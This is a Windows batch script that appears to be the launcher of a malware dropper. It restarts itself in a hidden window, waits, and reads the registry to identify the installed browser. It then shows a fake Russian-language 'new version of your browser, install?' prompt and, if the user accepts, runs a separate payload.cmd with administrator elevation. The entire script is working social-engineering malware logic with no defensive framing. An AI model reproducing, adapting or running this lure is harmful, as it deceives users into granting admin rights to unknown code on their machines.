@echo off
chcp 65001 >nul 2>nul

:: Start hidden ::

	if not "%1" == "hidden" (
		start "" wscript "%~dp0hiddenstart.vbs" "cmd /c ^"%~dp0index.cmd^" hidden"
		exit /b
	)


sleep 60

:: Detect browser ::

	set browser=Internet Explorer

	:: Firefox ::

		:: Firefox x86 ::
		reg query "HKLM\SOFTWARE\Mozilla\Mozilla Firefox" /s >nul 2>nul
		if "%ERRORLEVEL%" == "0" (
			set browser=Mozilla Firefox
		)

		:: Firefox x64 ::
		reg query "HKLM\SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox" /s >nul 2>nul
		if "%ERRORLEVEL%" == "0" (
			set browser=Mozilla Firefox
		)

	:: Chrome ::

		reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /s >nul 2>nul
		if "%ERRORLEVEL%" == "0" (
			set browser=Google Chrome
		)

	:: Opera ::

		reg query "HKEY_CLASSES_ROOT\Opera.HTML\shell\open\ddeexec\Application" /s >nul 2>nul
		if "%ERRORLEVEL%" == "0" (
			set browser=Opera
		)


:: Show window ::
	wscript "%~dp0box.vbs" "Вышла новая версия %browser%. Установить?" "%browser%"
	if "%ERRORLEVEL%" == "2" (
		exit /b
	)


wscript "%~dp0admin.vbs" "^"%~dp0payload.cmd^" ^"^^^"%browser%^^^"^""